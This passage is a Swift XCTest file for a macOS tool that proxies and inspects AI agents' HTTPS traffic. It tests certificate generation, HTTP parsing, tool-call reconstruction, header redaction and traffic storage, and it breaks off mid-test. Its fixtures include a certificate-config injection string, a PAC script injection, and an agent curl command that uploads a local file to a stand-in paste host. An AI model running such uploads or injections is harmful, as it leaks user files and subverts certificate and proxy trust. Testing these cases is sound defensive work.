import Security
import XCTest
@testable import Flowlight

final class CertificateAuthorityTests: XCTestCase {
    func testCreatesCAAndLeafIdentity() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("ca-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: dir) }
        let ca = CertificateAuthority(directory: dir)
        try ca.ensure()
        XCTAssertTrue(ca.exists)
        XCTAssertNotNil(ca.fingerprint)
        let bundle = try String(contentsOf: ca.bundleURL, encoding: .utf8)
        XCTAssertTrue(bundle.contains(try String(contentsOf: ca.caCertificateURL, encoding: .utf8)))

        let identity = try ca.identity(for: "api.example.com")
        var cert: SecCertificate?
        XCTAssertEqual(SecIdentityCopyCertificate(identity, &cert), errSecSuccess)
        XCTAssertEqual(SecCertificateCopySubjectSummary(cert!) as String?, "api.example.com")
        // Cached: the same identity object comes back.
        XCTAssertTrue(try ca.identity(for: "API.example.com") === identity)
        XCTAssertNoThrow(try ca.identity(for: "203.0.113.7"))
    }

    func testConfigSafeStripsInjection() {
        XCTAssertEqual(CertificateAuthority.configSafe("evil.com\n[v3_ca]\nbasicConstraints=CA:TRUE"), "evil.comv3_cabasicConstraintsCA:TRUE")
    }
}

final class ProxyRequestHeadTests: XCTestCase {
    func testConnectAuthority() throws {
        let head = try XCTUnwrap(ProxyRequestHead.parse(Data("CONNECT API.Anthropic.com:443 HTTP/1.1\r\nHost: api.anthropic.com:443\r\n\r\n".utf8)))
        XCTAssertEqual(head.method, "CONNECT")
        XCTAssertEqual(head.authority?.0, "api.anthropic.com")
        XCTAssertEqual(head.authority?.1, 443)
        XCTAssertEqual(ProxyRequestHead.parse(Data("CONNECT [2001:db8::1]:8443 HTTP/1.1\r\n\r\n".utf8))?.authority?.0, "2001:db8::1")
        XCTAssertEqual(ProxyRequestHead.parse(Data("CONNECT [2001:db8::1]:8443 HTTP/1.1\r\n\r\n".utf8))?.authority?.1, 8443)
        XCTAssertNil(ProxyRequestHead.parse(Data("CONNECT :0 HTTP/1.1\r\n\r\n".utf8))?.authority)
        XCTAssertNil(ProxyRequestHead.parse(Data("garbage\r\n\r\n".utf8)))
    }

    func testOriginFormDropsProxyHeaders() throws {
        let head = try XCTUnwrap(ProxyRequestHead.parse(Data(
            "GET http://example.com/a/b?q=1 HTTP/1.1\r\nHost: example.com\r\nProxy-Connection: keep-alive\r\nAccept: */*\r\n\r\n".utf8)))
        XCTAssertEqual(String(decoding: head.originForm(), as: UTF8.self),
                       "GET /a/b?q=1 HTTP/1.1\r\nHost: example.com\r\nAccept: */*\r\n\r\n")
    }
}

final class HTTPStreamParserTests: XCTestCase {
    private func collect(_ parser: HTTPStreamParser) -> () -> [(HTTPHead, HTTPBody)] {
        var out: [(HTTPHead, HTTPBody)] = []
        parser.onMessage = { out.append(($0, $1)) }
        return { out }
    }

    func testContentLengthAndPipelining() {
        let parser = HTTPStreamParser(direction: .request)
        let messages = collect(parser)
        let raw = "POST /v1/messages HTTP/1.1\r\nHost: a\r\nContent-Length: 5\r\n\r\nhelloGET /x HTTP/1.1\r\nHost: a\r\n\r\n"
        // Byte by byte, to exercise every split point.
        for byte in Data(raw.utf8) { parser.feed(Data([byte])) }
        XCTAssertEqual(messages().count, 2)
        XCTAssertEqual(messages()[0].0.method, "POST")
        XCTAssertEqual(String(decoding: messages()[0].1.data, as: UTF8.self), "hello")
        XCTAssertEqual(messages()[1].0.target, "/x")
    }

    func testChunkedResponseAndHead() {
        let parser = HTTPStreamParser(direction: .response)
        parser.requestMethods = ["HEAD", "POST"]
        let messages = collect(parser)
        parser.feed(Data("HTTP/1.1 200 OK\r\nContent-Length: 999\r\n\r\n".utf8))   // HEAD: no body despite the length
        parser.feed(Data("HTTP/1.1 100 Continue\r\n\r\nHTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nda".utf8))
        parser.feed(Data("ta\r\n6;ext=1\r\n: ping\r\n0\r\n\r\n".utf8))
        XCTAssertEqual(messages().count, 2)
        XCTAssertEqual(messages()[0].1.data.count, 0)
        XCTAssertEqual(String(decoding: messages()[1].1.data, as: UTF8.self), "data: ping")
    }

    func testGzipBodyAndTruncation() throws {
        let text = String(repeating: "{\"type\":\"tool_use\"}", count: 200)
        let gz = try gzip(Data(text.utf8))
        let parser = HTTPStreamParser(direction: .response)
        let messages = collect(parser)
        var raw = Data("HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\nContent-Length: \(gz.count)\r\n\r\n".utf8)
        raw.append(gz)
        parser.feed(raw)
        XCTAssertEqual(String(decoding: messages()[0].1.data, as: UTF8.self), text)
        XCTAssertEqual(messages()[0].1.wireSize, gz.count)

        let small = HTTPStreamParser(direction: .request, limit: 4)
        let smallMessages = collect(small)
        small.feed(Data("PUT / HTTP/1.1\r\nContent-Length: 10\r\n\r\n0123456789".utf8))
        XCTAssertEqual(smallMessages()[0].1.data, Data("0123".utf8))
        XCTAssertTrue(smallMessages()[0].1.truncated)
        XCTAssertEqual(smallMessages()[0].1.wireSize, 10)
    }

    func testUntilCloseAndUpgrade() {
        let parser = HTTPStreamParser(direction: .response)
        let messages = collect(parser)
        parser.feed(Data("HTTP/1.0 200 OK\r\n\r\npartial".utf8))
        XCTAssertEqual(messages().count, 0)
        parser.finish()
        XCTAssertEqual(String(decoding: messages()[0].1.data, as: UTF8.self), "partial")

        let ws = HTTPStreamParser(direction: .response)
        let wsMessages = collect(ws)
        ws.feed(Data("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n\r\n\u{81}\u{05}hello".utf8))
        ws.feed(Data("HTTP/1.1 200 OK\r\n\r\n".utf8))
        XCTAssertEqual(wsMessages().count, 1)
    }

    func testRedaction() {
        let headers = HeaderRedaction.redact([
            HTTPHeader(name: "Authorization", value: "Bearer sk-ant-secret"),
            HTTPHeader(name: "x-api-key", value: "sk-123"),
            HTTPHeader(name: "Cookie", value: "a=b"),
            HTTPHeader(name: "anthropic-version", value: "2023-06-01"),
        ])
        XCTAssertEqual(headers[0].value, "Bearer ••• redacted (20 characters)")
        XCTAssertEqual(headers[1].value, "••• redacted (6 characters)")
        XCTAssertFalse(headers.map(\.value).joined().contains("sk-"))
        XCTAssertEqual(headers[3].value, "2023-06-01")
    }

    private func gzip(_ data: Data) throws -> Data {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/usr/bin/gzip")
        p.arguments = ["-c"]
        let input = Pipe(), output = Pipe()
        p.standardInput = input; p.standardOutput = output
        try p.run()
        input.fileHandleForWriting.write(data); try input.fileHandleForWriting.close()
        let out = output.fileHandleForReading.readDataToEndOfFile()
        p.waitUntilExit()
        return out
    }
}

final class LLMToolCallReaderTests: XCTestCase {
    func testAnthropicStreamRebuildsInput() {
        // Shape taken from a real Claude Code response; ids and text are made up.
        let sse = """
        event: message_start
        data: {"type":"message_start","message":{"model":"claude-x","id":"msg_1","role":"assistant","content":[]}}

        event: content_block_start
        data: {"type":"content_block_start","index":0,"content_block":{"type":"text","text":""}}

        event: content_block_start
        data: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_A","name":"Bash","input":{}}}

        event: content_block_delta
        data: {"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\\"command\\": \\"curl -s https://paste.exa"}}

        event: content_block_delta
        data: {"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"mple/up\\"}"}}

        event: content_block_stop
        data: {"type":"content_block_stop","index":1}

        event: content_block_start
        data: {"type":"content_block_start","index":2,"content_block":{"type":"tool_use","id":"toolu_B","name":"mcp__github__create_issue","input":{}}}

        event: content_block_delta
        data: {"type":"content_block_delta","index":2,"delta":{"type":"input_json_delta","partial_json":"{\\"title\\":\\"x\\"}"}}

        event: content_block_stop
        data: {"type":"content_block_stop","index":2}

        event: message_stop
        data: {"type":"message_stop"}
        """
        let calls = LLMToolCallReader.responseCalls(Data(sse.utf8))
        XCTAssertEqual(calls.map(\.displayName), ["Bash", "github › create_issue"])
        XCTAssertEqual(calls[0].summary, "curl -s https://paste.example/up")
        XCTAssertEqual(calls[0].callID, "toolu_A")
        XCTAssertEqual(calls[1].input, #"{"title":"x"}"#)
        XCTAssertEqual(calls[1].source, .anthropic)
    }

    func testAnthropicJSONAndMCPConnector() {
        let json = #"{"id":"msg","role":"assistant","content":[{"type":"text","text":"hi"},{"type":"tool_use","id":"t1","name":"Read","input":{"file_path":"/tmp/a"}},{"type":"mcp_tool_use","id":"t2","name":"search","server_name":"linear","input":{"query":"bug"}}]}"#
        let calls = LLMToolCallReader.responseCalls(Data(json.utf8))
        XCTAssertEqual(calls.map(\.displayName), ["Read", "linear › search"])
        XCTAssertEqual(calls.map(\.summary), ["/tmp/a", "bug"])
    }

    func testOpenAIChatStreamAndJSON() {
        let sse = """
        data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"id":"call_1","function":{"name":"shell","arguments":""}}]}}]}
        data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"function":{"arguments":"{\\"cmd\\":[\\"ls\\","}}]}}]}
        data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"function":{"arguments":"\\"-la\\"]}"}}]}}]}
        data: [DONE]
        """
        let calls = LLMToolCallReader.responseCalls(Data(sse.utf8))
        XCTAssertEqual(calls.count, 1)
        XCTAssertEqual(calls[0].name, "shell")
        XCTAssertEqual(calls[0].summary, "ls -la")

        let json = #"{"choices":[{"message":{"role":"assistant","tool_calls":[{"id":"c","type":"function","function":{"name":"get_weather","arguments":"{\"q\":\"Paris\"}"}}]}}]}"#
        XCTAssertEqual(LLMToolCallReader.responseCalls(Data(json.utf8)).first?.summary, "Paris")
    }

    func testOpenAIResponsesAndGemini() {
        let responses = #"{"object":"response","output":[{"type":"function_call","call_id":"fc1","name":"apply_patch","arguments":"{\"path\":\"a.swift\"}"},{"type":"mcp_call","id":"m1","server_label":"stripe","name":"refund","arguments":"{}"}]}"#
        XCTAssertEqual(LLMToolCallReader.responseCalls(Data(responses.utf8)).map(\.displayName), ["apply_patch", "stripe › refund"])

        let stream = #"data: {"type":"response.output_item.done","item":{"type":"function_call","call_id":"fc9","name":"exec","arguments":"{\"command\":\"git push\"}"}}"#
        XCTAssertEqual(LLMToolCallReader.responseCalls(Data(stream.utf8)).first?.summary, "git push")

        let gemini = #"[{"candidates":[{"content":{"parts":[{"functionCall":{"name":"run_shell_command","args":{"command":"rm -rf build"}}}]}}]}]"#
        let call = LLMToolCallReader.responseCalls(Data(gemini.utf8)).first
        XCTAssertEqual(call?.source, .gemini)
        XCTAssertEqual(call?.summary, "rm -rf build")
    }

    func testMCPToolsCallRequestAndNoise() {
        let request = #"{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"create_issue","arguments":{"title":"t"}}}"#
        let calls = LLMToolCallReader.mcpRequestCalls(Data(request.utf8), host: "mcp.example.com")
        XCTAssertEqual(calls.first?.displayName, "mcp.example.com › create_issue")
        XCTAssertEqual(calls.first?.callID, "7")
        XCTAssertTrue(LLMToolCallReader.mcpRequestCalls(Data(#"{"method":"tools/list","jsonrpc":"2.0","id":1}"#.utf8), host: "h").isEmpty)
        XCTAssertTrue(LLMToolCallReader.responseCalls(Data("<html>not json</html>".utf8)).isEmpty)
    }
}

final class InspectionStorageTests: XCTestCase {
    func testNeverInspectMatchingAndPAC() {
        XCTAssertTrue(InspectionController.matches(host: "gateway.icloud.com", patterns: ["icloud.com"]))
        XCTAssertTrue(InspectionController.matches(host: "apple.com", patterns: ["*.apple.com"]))
        XCTAssertFalse(InspectionController.matches(host: "notapple.com", patterns: ["apple.com"]))
        let pac = InspectionController.pacScript(port: 8877, never: ["apple.com", "evil\"); alert(1); (\""])
        XCTAssertTrue(pac.contains("\"apple.com\""))
        XCTAssertTrue(pac.contains("PROXY 127.0.0.1:8877; DIRECT"))
        XCTAssertFalse(pac.contains("alert(1)\""))
    }

    func testExchangeRoundTrip() throws {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("x-\(UUID().uuidString).sqlite")
        defer { try? FileManager.default.removeItem(at: url) }
        let db = try TrafficDatabase(url: url)
        let call = ToolCall(source: .anthropic, callID: "t", name: "Bash", mcpServer: nil, input: #"{"command":"ls"}"#, summary: "ls")
        let exchange = HTTPExchange(
            id: nil, started: Date(), duration: 1.5, scheme: "https", host: "api.anthropic.com", port: 443, method: "POST",
            path: "/v1/messages", status: 200, requestHeaders: [HTTPHeader(name: "Content-Type", value: "application/json")],
            requestBody: Data("{}".utf8), requestSize: 2, requestTruncated: false, responseHeaders: [], responseBody: Data([0, 1, 2]),
            responseSize: 3, responseTruncated: false, contentType: "text/event-stream", pid: 42, bundleID: "claude", appName: "claude",
            agent: "claude", agentName: "Claude Code", mcpServer: nil, toolCalls: [call], note: nil)
        try db.insertExchange(exchange)
        let rows = try db.exchanges(since: Date().addingTimeInterval(-60))
        XCTAssertEqual(rows.count, 1)
        XCTAssertEqual(rows[0].toolCalls, [call])
        XCTAssertEqual(rows[0].agentName, "Claude Code")
        XCTAssertEqual(rows[0].status, 200)
        XCTAssertEqual(rows[0].url, "https://api.anthropic.com/v1/messages")
        XCTAssertEqual(try db.exchangeBodies(id: rows[0].id!)?.response, Data([0, 1, 2]))
        XCTAssertEqual(try db.exchanges(since: .distantPast, search: "Bash").count, 1)
        XCTAssertEqual(try db.exchanges(since: .distantPast, search: "nothing-matches").count, 0)
        try db.pruneExchanges(olderThan: Date().addingTimeInterval(60))
        XCTAssertTrue(try db.exchanges(since: .distantPast).isEmpty)
    }
}

final class ToolCallLinksTests: XCTestCase {
    private func exchange(_ id: Int64, at: Double, app: String, bundle: String, host: String, calls: [ToolCall] = []) -> HTTPExchange {
        HTTPExchange(id: id, started: Date(timeIntervalSince1970: at), duration: 0.5, scheme: "https", host: host, port: 443, method: "GET",
                     path: "/", status: 200, requestHeaders: [], requestBody: Data(), requestSize: 0, requestTruncated: false,
                     responseHeaders: [], responseBody: Data(), responseSize: 0, responseTruncated: false, contentType: "", pid: 1,
                     bundleID: bundle, appName: app, agent: "claude", agentName: "Claude Code", mcpServer: nil, toolCalls: calls, note: nil)
    }

    func testLinksToolRequestToTheCallThatNamedItsHost() {
        let bash = LLMToolCallReader.make(.anthropic, id: "a", name: "Bash", input: ["command": "curl -s https://paste.example/up -d @notes.txt"])
        let other = LLMToolCallReader.make(.anthropic, id: "b", name: "Bash", input: ["command": "git push origin main"])
        let rows = [
            exchange(1, at: 100, app: "claude", bundle: "claude", host: "api.anthropic.com", calls: [bash]),
            exchange(2, at: 110, app: "claude", bundle: "claude", host: "api.anthropic.com", calls: [other]),
            exchange(3, at: 112, app: "curl", bundle: "curl", host: "paste.example"),
            exchange(4, at: 113, app: "git-remote-https", bundle: "git-remote-https", host: "github.com"),
            exchange(5, at: 90, app: "curl", bundle: "curl", host: "paste.example"),        // before the call
            exchange(6, at: 114, app: "claude", bundle: "claude", host: "paste.example"),   // the agent itself, not a tool
        ]
        let links = ToolCallLinks.link(rows)
        XCTAssertEqual(links[3]?.call.callID, "a")
        XCTAssertNil(links[4], "git push doesn't name github.com and the process isn't called git")
        XCTAssertNil(links[5])
        XCTAssertNil(links[6])
    }

    func testHookRequestIsNotBlamedOnAnUnrelatedCall() {
        let call = LLMToolCallReader.make(.anthropic, id: "d", name: "Bash", input: ["command": "curl -s https://example.com/probe"])
        let rows = [
            exchange(1, at: 100, app: "claude", bundle: "claude", host: "api.anthropic.com", calls: [call]),
            exchange(2, at: 105, app: "curl", bundle: "curl", host: "ntfy.sh"),   // a notification hook, same program
        ]
        XCTAssertNil(ToolCallLinks.link(rows)[2])
    }

    func testFallsBackToTheProgramName() {
        let call = LLMToolCallReader.make(.anthropic, id: "c", name: "Bash", input: ["command": "cd app && npm install"])
        let rows = [
            exchange(1, at: 100, app: "claude", bundle: "claude", host: "api.anthropic.com", calls: [call]),
            exchange(2, at: 104, app: "npm", bundle: "npm", host: "registry.npmjs.org"),
            exchange(3, at: 300, app: "npm", bundle: "npm", host: "registry.npmjs.org"),   // too late for a name-only match
        ]
        let links = ToolCallLinks.link(rows)
        XCTAssertEqual(links[2]?.call.callID, "c")
        XCTAssertNil(links[3])
    }
}

final class ProxyAttributionTests: XCTestCase {
    func testProxiedTrafficGoesBackToTheApp() {
        let attribution = ProxyAttribution()
        attribution.proxyPort = 8877
        attribution.record(host: "httpbin.org", ip: "203.0.113.9",
                           owner: .init(pid: 77, bundleID: "curl", appName: "curl", appPath: "/usr/bin/curl",
                                        agent: "claude", agentName: "Claude Code", mcpServer: nil))
        func record(pid: Int32, bundle: String, ip: String, port: UInt16, domain: String = "") -> TrafficRecord {
            TrafficRecord(key: FlowKey(pid: pid, bundleID: bundle, appName: bundle, appPath: "", remoteIP: ip, domain: domain,
                                       port: port, transport: .tcp, appProtocol: "https"),
                          counters: FlowCounters(bytesIn: 100, bytesOut: 10, flows: 1))
        }
        let me = getpid()
        let batch = TrafficBatch(timestamp: 1, records: [
            record(pid: 77, bundle: "curl", ip: "127.0.0.1", port: 8877),                      // app → proxy: dropped
            record(pid: me, bundle: "com.flowlight.app", ip: "127.0.0.1", port: 51000),         // proxy loopback leg: dropped
            record(pid: me, bundle: "com.flowlight.app", ip: "203.0.113.9", port: 443),         // upstream: back to curl
            record(pid: me, bundle: "com.flowlight.app", ip: "140.82.1.1", port: 443, domain: "api.github.com"), // update check
        ])
        let out = attribution.rewrite([batch])[0].records
        XCTAssertEqual(out.count, 2)
        XCTAssertEqual(out[0].key.bundleID, "curl")
        XCTAssertEqual(out[0].key.parentAgent, "claude")
        XCTAssertEqual(out[1].key.bundleID, "com.flowlight.app")
    }
}

final class JSONValueTests: XCTestCase {
    func testKeepsKeyOrderAndTypes() throws {
        let v = try XCTUnwrap(JSONValue.parse(#"{"type":"tool_use","name":"Bash","input":{"command":"ls"},"n":-1.5e3,"ok":true,"x":null,"a":[1,"two"]}"#))
        guard case .object(let pairs) = v else { return XCTFail() }
        XCTAssertEqual(pairs.map(\.key), ["type", "name", "input", "n", "ok", "x", "a"])
        XCTAssertEqual(v["n"], .number("-1.5e3"))
        XCTAssertEqual(v["a"], .array([.number("1"), .string("two")]))
        XCTAssertEqual(v["input"]?["command"], .string("ls"))
    }

    func testEscapesAndUnicode() throws {
        let v = try XCTUnwrap(JSONValue.parse(#"["line\nbreak","été","🚀","café \"q\" \\ /"]"#))
        XCTAssertEqual(v, .array([.string("line\nbreak"), .string("été"), .string("🚀"), .string("café \"q\" \\ /")]))
        XCTAssertEqual(JSONValue.parse(Data("\"日本語\"".utf8)), .string("日本語"))
    }

    func testRejectsInvalid() {
        for bad in ["", "{", "[1,]", "{\"a\" 1}", "tru", "{\"a\":1} x", "01x"] {
            XCTAssertNil(JSONValue.parse(bad), bad)
        }
    }

    func testPrettyRoundTrips() throws {
        let text = #"{"b":[1,{"c":"d\n"}],"a":{}}"#
        let v = try XCTUnwrap(JSONValue.parse(text))
        XCTAssertEqual(JSONValue.parse(v.pretty()), v)
        XCTAssertTrue(v.pretty().hasPrefix("{\n  \"b\": [\n    1,"))
    }

    func testClassifiesBodies() {
        XCTAssertEqual(BodyContent.classify(Data()), .empty)
        XCTAssertEqual(BodyContent.classify(Data("<html></html>".utf8)), .text("<html></html>"))
        let sse = "event: message_start\ndata: {\"type\":\"message_start\"}\n\n: ping\ndata: {\"type\":\"ping\"}\n\ndata: [DONE]\n"
        guard case .events(let events) = BodyContent.classify(Data(sse.utf8)) else { return XCTFail() }
        XCTAssertEqual(events.map(\.event), ["message_start", nil])
        guard case .json = BodyContent.classify(Data(#"{"a":1}"#.utf8)) else { return XCTFail() }
    }
}

final class ToolResultReaderTests: XCTestCase {
    func testResultsSentBackToTheModel() {
        let anthropic = #"{"model":"m","messages":[{"role":"assistant","content":[{"type":"tool_use","id":"t1","name":"Bash","input":{}}]},{"role":"user","content":[{"type":"tool_result","tool_use_id":"t1","content":[{"type":"text","text":"200"}]},{"type":"tool_result","tool_use_id":"t2","is_error":true,"content":"permission denied"}]}]}"#
        let r = ToolResultReader.results(inRequest: Data(anthropic.utf8))
        XCTAssertEqual(r.map(\.callID), ["t1", "t2"])
        XCTAssertEqual(r[0].output, "200")
        XCTAssertFalse(r[0].isError)
        XCTAssertTrue(r[1].isError)

        let chat = #"{"messages":[{"role":"tool","tool_call_id":"call_9","content":"Error: file not found"}]}"#
        let c = ToolResultReader.results(inRequest: Data(chat.utf8))
        XCTAssertEqual(c.first?.callID, "call_9")
        XCTAssertEqual(c.first?.isError, true, "error text counts as a failure")

        let responses = #"{"input":[{"type":"function_call_output","call_id":"fc1","output":"ok"}]}"#
        XCTAssertEqual(ToolResultReader.results(inRequest: Data(responses.utf8)).first?.output, "ok")

        let gemini = #"{"contents":[{"role":"user","parts":[{"functionResponse":{"name":"run_shell_command","response":{"output":"done"}}}]}]}"#
        XCTAssertEqual(ToolResultReader.results(inRequest: Data(gemini.utf8)).first?.callID, "gemini:run_shell_command")
    }

    func testProviderRunMCPCallResult() {
        let body = #"{"object":"response","output":[{"type":"mcp_call","id":"mcp_1","server_label":"stripe","name":"refund","arguments":"{}","output":"refunded","error":null}]}"#
        let r = ToolResultReader.results(inResponse: Data(body.utf8))
        XCTAssertEqual(r.first?.callID, "mcp_1")
        XCTAssertEqual(r.first?.output, "refunded")
        XCTAssertEqual(r.first?.isError, false)
    }

    func testMCPJSONRPCOverHTTP() {
        let initialize = ToolResultReader.mcpActivity(
            request: Data(#"{"jsonrpc":"2.0","id":0,"method":"initialize","params":{}}"#.utf8),
            response: Data("event: message\ndata: {\"jsonrpc\":\"2.0\",\"id\":0,\"result\":{\"serverInfo\":{\"name\":\"Linear\",\"version\":\"1.2\"}}}\n\n".utf8),
            host: "mcp.linear.app", path: "/mcp?x=1", knownName: nil)
        XCTAssertEqual(initialize.first?.server, "Linear")
        XCTAssertEqual(initialize.first?.version, "1.2")
        XCTAssertEqual(initialize.first?.endpoint, "mcp.linear.app/mcp")

        let list = ToolResultReader.mcpActivity(
            request: Data(#"{"jsonrpc":"2.0","id":1,"method":"tools/list"}"#.utf8),
            response: Data(#"{"jsonrpc":"2.0","id":1,"result":{"tools":[{"name":"search_issues"},{"name":"create_issue"}]}}"#.utf8),
            host: "mcp.linear.app", path: "/mcp", knownName: "Linear")
        XCTAssertEqual(list.first?.tools, ["search_issues", "create_issue"])
        XCTAssertEqual(list.first?.server, "Linear")

        let call = ToolResultReader.mcpActivity(
            request: Data(#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"create_issue","arguments":{"title":"Bug"}}}"#.utf8),
            response: Data(#"{"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"Created ENG-1"}],"isError":false}}"#.utf8),
            host: "mcp.linear.app", path: "/mcp", knownName: "Linear")
        XCTAssertEqual(call.first?.tool, "create_issue")
        XCTAssertEqual(call.first?.output, "Created ENG-1")
        XCTAssertEqual(call.first?.isError, false)

        let failed = ToolResultReader.mcpActivity(
            request: Data(#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"x"}}"#.utf8),
            response: Data(#"{"jsonrpc":"2.0","id":3,"error":{"code":-32602,"message":"Unknown tool"}}"#.utf8),
            host: "h", path: "/", knownName: nil)
        XCTAssertEqual(failed.first?.isError, true)
        XCTAssertEqual(failed.first?.output, "Unknown tool")

        XCTAssertTrue(ToolResultReader.mcpActivity(request: Data(#"{"jsonrpc":"2.0","method":"notifications/initialized"}"#.utf8),
                                                   response: Data(), host: "h", path: "/", knownName: nil).isEmpty)
        XCTAssertTrue(ToolResultReader.mcpActivity(request: Data(#"{"model":"x"}"#.utf8), response: Data(), host: "h", path: "/", knownName: nil).isEmpty)
    }
}

final class ToolActivityTests: XCTestCase {
    func testJoinsCallsResultsRequestsAndServers() {
        func ex(_ id: Int64, _ at: Double, app: String, host: String, calls: [ToolCall] = [], results: [ToolResult] = [],
                mcp: [MCPActivity] = []) -> HTTPExchange {
            HTTPExchange(id: id, started: Date(timeIntervalSince1970: at), duration: 0.5, scheme: "https", host: host, port: 443,
                         method: "GET", path: "/", status: 200, requestHeaders: [], requestBody: Data(), requestSize: 0,
                         requestTruncated: false, responseHeaders: [], responseBody: Data(), responseSize: 0, responseTruncated: false,
                         contentType: "", pid: 1, bundleID: app, appName: app, agent: "claude", agentName: "Claude Code",
                         mcpServer: nil, toolCalls: calls, toolResults: results, mcp: mcp, note: nil)
        }
        let bash = LLMToolCallReader.make(.anthropic, id: "t1", name: "Bash", input: ["command": "curl -s https://httpbin.org/uuid"])
        let issue = LLMToolCallReader.make(.anthropic, id: "t2", name: "mcp__linear__create_issue", input: ["title": "x"])
        let rows = [
            ex(1, 100, app: "claude", host: "api.anthropic.com", calls: [bash, issue]),
            ex(2, 102, app: "curl", host: "httpbin.org"),
            ex(3, 105, app: "claude", host: "api.anthropic.com", results: [
                ToolResult(callID: "t1", isError: false, output: "{\"uuid\":\"1\"}", outputSize: 12),
                ToolResult(callID: "t2", isError: true, output: "Unauthorized", outputSize: 12),
            ]),
            ex(4, 90, app: "claude", host: "mcp.linear.app", mcp: [
                MCPActivity(server: "linear", endpoint: "mcp.linear.app/mcp", method: "tools/list", tools: ["create_issue", "search"],
                            version: "2.0", isError: false),
            ]),
        ]
        let activity = ToolActivityBuilder.activities(rows)["claude"] ?? []
        XCTAssertEqual(activity.count, 2)
        let b = activity.first { $0.call.name == "Bash" }
        XCTAssertEqual(b?.outcome, .ok)
        XCTAssertEqual(b?.requests.map(\.host), ["httpbin.org"])
        XCTAssertEqual(activity.first { $0.call.name == "create_issue" }?.outcome, .error)

        let servers = ToolActivityBuilder.servers(rows, activities: ["claude": activity], configured: ["claude": ["github"]])["claude"] ?? []
        let linear = servers.first { $0.name.lowercased() == "linear" }
        XCTAssertEqual(linear?.calls, 1)
        XCTAssertEqual(linear?.errors, 1)
        XCTAssertEqual(linear?.tools, ["create_issue", "search"])
        XCTAssertEqual(linear?.version, "2.0")
        XCTAssertTrue(linear?.isRemote ?? false)
        XCTAssertEqual(servers.first { $0.name == "github" }?.calls, 0)

        let usage = ToolUsage.build(["claude": activity])["claude"] ?? []
        XCTAssertEqual(usage.first { $0.name == "linear › create_issue" }?.errors, 1)
    }
}

final class DemoInspectionTests: XCTestCase {
    func testDemoSessionIsComplete() throws {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("demo-\(UUID().uuidString).sqlite")
        defer { try? FileManager.default.removeItem(at: url) }
        let db = try TrafficDatabase(url: url)
        try DemoData.seedInspection(db, now: Date())
        let exchanges = try db.exchanges(since: Date().addingTimeInterval(-3600))
        let activity = ToolActivityBuilder.activities(exchanges)["claude"] ?? []
        XCTAssertEqual(activity.map(\.call.displayName).sorted(),
                       ["Bash", "Bash", "Bash", "Read", "docs › search_docs", "github › create_issue"])
        XCTAssertTrue(activity.allSatisfy { $0.result != nil }, "every call has its result")
        XCTAssertTrue(activity.allSatisfy { $0.call.input.count > 2 }, "streamed inputs are rebuilt")
        XCTAssertEqual(activity.first { $0.call.name == "create_issue" }?.call.summary, "Pre-launch TODOs")
        XCTAssertEqual(activity.filter { $0.outcome == .error }.map { $0.call.summary }, ["git push origin main"])
        let upload = activity.first { $0.call.summary?.contains("paste.example") == true }
        XCTAssertEqual(upload?.requests.map(\.host), ["paste.example"])
        let docs = ToolActivityBuilder.servers(exchanges, activities: ["claude": activity])["claude"]?.first { $0.name == "docs" }
        XCTAssertEqual(docs?.version, "1.4.2")
        XCTAssertEqual(docs?.tools, ["fetch_page", "list_spaces", "search_docs"])
        XCTAssertFalse(exchanges.flatMap(\.requestHeaders).contains { $0.value.contains("sk-ant") }, "demo keys are redacted too")
    }
}

final class LLMFactsReaderTests: XCTestCase {
    func testAnthropicDeclarationsConnectorsAndUsage() throws {
        // Shapes from the Messages API reference: mcp_servers + mcp_toolset, server tools carry a type, not input_schema.
        let request = """
        {"model":"claude-sonnet-x","max_tokens":4096,"system":"You are Claude Code","mcp_servers":[
          {"type":"url","url":"https://mcp.linear.app/sse","name":"linear","authorization_token":"tok"}],
         "tools":[{"name":"Bash","description":"Run a command","input_schema":{"type":"object"}},
                  {"type":"web_search_20250305","name":"web_search","max_uses":5},
                  {"type":"mcp_toolset","mcp_server_name":"linear","default_config":{"enabled":false},
                   "configs":{"search_issues":{"enabled":true},"delete_issue":{"enabled":false}}},
                  {"name":"mcp__github__create_issue","input_schema":{"type":"object"}}],
         "messages":[]}
        """
        let response = """
        event: message_start
        data: {"type":"message_start","message":{"model":"claude-sonnet-x-20260101","usage":{"input_tokens":12,"cache_read_input_tokens":9000,"cache_creation_input_tokens":300,"output_tokens":1}}}

        event: message_delta
        data: {"type":"message_delta","delta":{"stop_reason":"tool_use"},"usage":{"input_tokens":12,"output_tokens":210}}
        """
        let facts = try XCTUnwrap(LLMFactsReader.facts(request: Data(request.utf8), response: Data(response.utf8), host: "api.anthropic.com"))
        XCTAssertEqual(facts.provider, .anthropic)
        XCTAssertEqual(facts.model, "claude-sonnet-x-20260101", "the response's model wins over the request's")
        XCTAssertEqual(facts.declaredTools.filter { $0.kind == .function }.map(\.name), ["Bash", "mcp__github__create_issue"])
        XCTAssertEqual(facts.declaredTools.first { $0.kind == .provider }?.name, "web_search")
        XCTAssertEqual(facts.declaredTools.first { $0.kind == .mcpToolset }?.server, "linear")
        XCTAssertEqual(facts.declaredTools.first { $0.name == "mcp__github__create_issue" }?.server, "github")
        let linear = try XCTUnwrap(facts.connectors.first)
        XCTAssertEqual(linear.url, "https://mcp.linear.app/sse")
        XCTAssertEqual(linear.allowedTools, ["search_issues"], "only tools left enabled")
        XCTAssertTrue(linear.authorized)
        XCTAssertEqual(facts.usage, TokenUsage(input: 12, output: 210, cacheRead: 9000, cacheWrite: 300, reasoning: 0))
